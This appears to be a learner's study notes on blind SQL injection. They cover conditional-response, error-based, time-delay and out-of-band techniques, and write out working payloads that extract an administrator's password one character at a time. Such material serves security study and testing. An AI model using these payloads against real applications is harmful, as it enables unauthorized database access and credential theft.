## SQLi Blind Injection
Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

_NB:_ Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities because they rely on being able to see the results of the injected query within the application response. 

### Blind SQLi Techniques
1. Triggering Conditional responses

- `' AND '1'='1`: This causes the query at the injected point to return results because the condition is true
- `' AND '1'='2`: This doesn't return any result because the injected condition is false

This allows to determine the answer to any single injected condition, and extract data one piece at a time.

_Example Payloads_

`injectionPoint' AND (SELECT 'a' FROM users LIMIT 1)='a` - This determines if there is a table called users 

i.e let's assume the applications response for when a condition is true is `success` then above payload returns success if table - users exist

`injectionPoint' AND (SELECT 'a' FROM users WHERE username='administrator')='a` - This determines if there is a user name administrator exists

`injectionPoint' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>[value])='a` - This is used to determine the length of a certain user's password after verifying they exist

`injectionPoint' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` - This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value (a in this case)

_NB:_ depending on the password length determined, the `1` variable after the first comma keeps varying while varying the payload value (easily done with burp intruder and GREP filter to catch the needed app response) as well until the full password is determined.

2. Triggering conditional errors

Error-based SQL injection allows the use of error messages to either extract or infer sensitive data from the database. 

It is able to induce the application to return a specific error response based on the result of a boolean expression, this can be exploited the same way as conditional responses.

- `injectionPoint' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)`: With the `CASE` expression, this evaluates to 'a' which doesn't cause any error

- `injectionPoint' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)`: This evaluates to `1/0` which causes a divide by zero error. 

- `injectionPoint' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')`: Checks if a username with administrator exists

If the error causes a difference in the application's HTTP response, this can be used to determine whether the injected condition is true (i.e replacing `1=1` to test with the intended query we're trying to get).

_NB:_ Different technique for triggering errors works for different database types(lookup ![cheatsheets](https://portswigger.net/web-security/sql-injection/cheat-sheet)).

_The above applies to Microsoft DBs ('a' can also be replaced with NULL)_

3. Triggering time delays

SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows to determine the truth of the injected condition based on the time taken to receive the HTTP response.

The techniques for triggering a time delay are specific to the database type in use.

_Example_

On a Microsoft SQL server;

- `'; IF (1=2) WAITFOR DELAY '0:0:10'--`: This does not trigger a time delay because the condition `1=2` is false.

- `'; IF (1=1) WAITFOR DELAY '0:0:10'--`: This triggers a time delay of 10 seconds because the condition `1=1` is true

Using this technique, data can retrieved by testing one character at a time

i.e `'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password,1,1) > 'm') = 1 WAITFOR DELAY '0:0:10'--` (using URL decode ';' is '%3B')

4. Triggering Out-of-band (OAST) Interactions

This technique is used by triggering out-of-band network interactions to a system that we control.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

_NB:_ As with other techniques, the methods for triggering a DNS query is specific to the type of database being used(lookup cheatsheets). It can also be used to perform data exfiltration from the application with help of **Burp collaborator**

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.